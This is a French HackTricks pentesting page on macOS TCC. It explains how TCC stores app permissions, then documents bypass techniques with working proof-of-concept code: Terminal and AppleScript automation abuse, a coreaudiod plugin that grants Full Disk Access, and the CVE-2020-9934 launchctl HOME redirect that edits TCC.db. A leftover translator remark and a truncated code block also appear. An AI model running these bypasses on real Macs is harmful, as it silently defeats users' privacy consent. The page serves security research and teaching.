# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersécurité ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la dernière version de PEASS ou télécharger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

**TCC (Transparency, Consent, and Control)** est un mécanisme dans macOS pour **limiter et contrôler l'accès des applications à certaines fonctionnalités**, généralement d'un point de vue de la confidentialité. Cela peut inclure des choses telles que les services de localisation, les contacts, les photos, le microphone, la caméra, l'accessibilité, l'accès complet au disque et bien plus encore.

Du point de vue de l'utilisateur, il voit TCC en action **lorsqu'une application veut accéder à l'une des fonctionnalités protégées par TCC**. Lorsque cela se produit, l'**utilisateur est invité** avec une boîte de dialogue lui demandant s'il souhaite autoriser l'accès ou non.

Il est également possible de **donner aux applications l'accès** aux fichiers par des **intentions explicites** des utilisateurs, par exemple lorsque l'utilisateur **glisse et dépose un fichier dans un programme** (évidemment, le programme doit y avoir accès).

![Un exemple de boîte de dialogue TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** est géré par le **démon** situé dans `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd` configuré dans `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (enregistrant le service mach `com.apple.tccd.system`).

Il y a un **tccd en mode utilisateur** en cours d'exécution par utilisateur connecté défini dans `/System/Library/LaunchAgents/com.apple.tccd.plist` enregistrant les services mach `com.apple.tccd` et `com.apple.usernotifications.delegate.com.apple.tccd`.

Les autorisations sont **héritées du parent** de l'application et les **autorisations** sont **suivies** en fonction de l'**ID de bundle** et de l'**ID de développeur**.

### Base de données TCC

Les sélections sont ensuite stockées dans la base de données TCC à l'échelle du système dans **`/Library/Application Support/com.apple.TCC/TCC.db`** ou dans **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** pour les préférences par utilisateur. La base de données est **protégée contre la modification avec SIP** (System Integrity Protection), mais vous pouvez les lire en accordant **un accès complet au disque**.

{% hint style="info" %}
L'**interface utilisateur du centre de notification** peut apporter des **changements dans la base de données TCC du système** :

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Cependant, les utilisateurs peuvent **supprimer ou interroger les règles** avec l'utilitaire en ligne de commande **`tccutil`**.
{% endhint %}

{% tabs %}
{% tab title="user DB" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}

{% tab title="Base de données système" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
En vérifiant les deux bases de données, vous pouvez vérifier les autorisations qu'une application a autorisées, interdites ou n'a pas (elle demandera l'autorisation).
{% endhint %}

* La **`auth_value`** peut avoir différentes valeurs : denied(0), unknown(1), allowed(2) ou limited(3).
* La **`auth_reason`** peut prendre les valeurs suivantes : Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Pour plus d'informations sur les **autres champs** de la table, [**consultez ce billet de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

{% hint style="info" %}
Certaines autorisations TCC sont : kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Il n'y a pas de liste publique qui les définit toutes, mais vous pouvez consulter cette [**liste de celles connues**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
{% endhint %}

Vous pouvez également vérifier les **autorisations déjà accordées** aux applications dans `Préférences Système --> Sécurité et confidentialité --> Confidentialité --> Fichiers et dossiers`.

### Vérifications de signature TCC

La **base de données** TCC stocke l'**ID de bundle** de l'application, mais elle stocke également des **informations** sur la **signature** pour **s'assurer** que l'application qui demande d'utiliser une autorisation est la bonne.
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"

```
{% endcode %}

### Attributions

Les applications **n'ont pas seulement besoin** de **demander** et d'obtenir l'accès à certaines ressources, elles doivent également **avoir les autorisations pertinentes**.\
Par exemple, **Telegram** a l'autorisation `com.apple.security.device.camera` pour demander **l'accès à la caméra**. Une **application** qui **n'a pas cette autorisation ne pourra pas** accéder à la caméra (et l'utilisateur ne sera même pas invité à donner les autorisations).

Cependant, pour que les applications **accèdent** à certains dossiers de l'utilisateur, tels que `~/Desktop`, `~/Downloads` et `~/Documents`, elles **n'ont pas besoin** d'avoir des **autorisations spécifiques**. Le système gérera l'accès de manière transparente et **invitera l'utilisateur** si nécessaire.

Les applications d'Apple **ne génèrent pas de pop-ups**. Elles contiennent des **droits préalablement accordés** dans leur liste d'autorisations, ce qui signifie qu'elles ne **généreront jamais de pop-up**, **ni** n'apparaîtront dans l'une des **bases de données TCC**. Par exemple:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```
Cela évitera que Calendrier demande à l'utilisateur d'accéder aux rappels, au calendrier et au carnet d'adresses.

### Endroits sensibles non protégés

* $HOME (lui-même)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intention de l'utilisateur / com.apple.macl

Comme mentionné précédemment, il est possible d'accorder l'accès à une application à un fichier en le faisant glisser-déposer dessus. Cet accès ne sera pas spécifié dans une base de données TCC mais en tant qu'**attribut étendu du fichier**. Cet attribut stockera l'UUID de l'application autorisée :
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Il est curieux que l'attribut **`com.apple.macl`** soit géré par le **bac à sable**, et non par tccd.
{% endhint %}

L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus car il est **protégé par SIP**. Cependant, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **compressant** le fichier, en le **supprimant** et en le **décompressant**.

## Contournements

### Contournement d'écriture

Ce n'est pas un contournement, c'est juste la façon dont TCC fonctionne : **il ne protège pas contre l'écriture**. Si le Terminal **n'a pas accès à la lecture du bureau d'un utilisateur, il peut toujours y écrire** :
```shell-session
username@hostname ~ % ls Desktop 
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'**attribut étendu `com.apple.macl`** est ajouté au nouveau **fichier** pour donner accès à l'application créatrice à sa lecture.

### Contournement SSH

Par défaut, un accès via **SSH** aura un accès **"Accès complet au disque"**. Pour le désactiver, vous devez le faire figurer dans la liste mais désactivé (le supprimer de la liste ne supprimera pas ces privilèges) :

![](<../../../../.gitbook/assets/image (569).png>)

Ici, vous pouvez trouver des exemples de la façon dont certains **malwares ont pu contourner cette protection** :

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

### Contournement Electron

Le code JS d'une application Electron n'est pas signé, donc un attaquant pourrait déplacer l'application vers un emplacement inscriptible, injecter un code JS malveillant et lancer cette application pour abuser des autorisations TCC.

Electron travaille sur la clé **`ElectronAsarIntegrity`** dans Info.plist qui contiendra un hachage du fichier app.asar pour vérifier l'intégrité du code JS avant de l'exécuter.

### Scripts Terminal

Il est courant de donner un **Accès complet au disque (FDA)** au terminal, du moins dans les ordinateurs utilisés par les personnes techniques. Et il est possible d'invoquer des scripts **`.terminal`** avec cela.

Les scripts **`.terminal`** sont des fichiers plist tels que celui-ci avec la commande à exécuter dans la clé **`CommandString`** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```
Une application pourrait écrire un script terminal dans un emplacement tel que /tmp et le lancer avec une commande telle que:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
### kTCCServiceAppleEvents / Automation

Une application avec la permission **`kTCCServiceAppleEvents`** sera capable de **contrôler d'autres applications**. Cela signifie qu'elle pourrait être capable d'**abuser des permissions accordées aux autres applications**.

Pour plus d'informations sur les scripts Apple, consultez :

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Par exemple, si une application a la **permission d'automatisation sur `iTerm`**, comme dans cet exemple où **`Terminal`** a accès à iTerm :

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sur iTerm

Terminal, qui n'a pas la FDA, peut appeler iTerm, qui l'a, et l'utiliser pour effectuer des actions :

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
{% endcode %} (This is a markdown tag and should not be translated)
```bash
osascript iterm.script
```
#### Sur Finder

Ou si une application a accès à Finder, elle pourrait exécuter un script comme celui-ci :
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
### Abus de processus

Si vous parvenez à **injecter du code dans un processus**, vous pourrez abuser des permissions TCC de ce processus.

Consultez les techniques d'abus de processus sur la page suivante :

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

Voir quelques exemples dans les sections suivantes :

### CVE-2020-29621 - Coreaudiod

Le binaire **`/usr/sbin/coreaudiod`** avait les entitlements `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier permettant l'**injection de code** et le second lui donnant accès à **gérer TCC**.

Ce binaire permettait de charger des **plug-ins tiers** à partir du dossier `/Library/Audio/Plug-Ins/HAL`. Par conséquent, il était possible de **charger un plugin et d'abuser des permissions TCC** avec ce PoC :
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    
    add_tcc_entry();
    
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```
### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Le démon **tccd** de l'espace utilisateur utilise la variable d'environnement **`HOME`** pour accéder à la base de données des utilisateurs TCC à partir de: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Selon [cette publication Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) et parce que le démon TCC s'exécute via `launchd` dans le domaine de l'utilisateur actuel, il est possible de **contrôler toutes les variables d'environnement** qui lui sont transmises.\
Ainsi, un **attaquant pourrait définir la variable d'environnement `$HOME`** dans **`launchctl`** pour pointer vers un **répertoire contrôlé**, **redémarrer** le démon **TCC**, puis **modifier directement la base de données TCC** pour se donner **tous les privilèges TCC disponibles** sans jamais demander l'autorisation de l'utilisateur final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump                                                               
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2023-26818 - Telegram

Telegram avait les entitlements `com.apple.security.cs.allow-dyld-environment-variables` et `com.apple.security.cs.disable-library-validation`, il était donc possible de l'exploiter pour **accéder à ses permissions** telles que l'enregistrement avec la caméra. Vous pouvez [**trouver la charge utile dans l'article**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

## Références

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
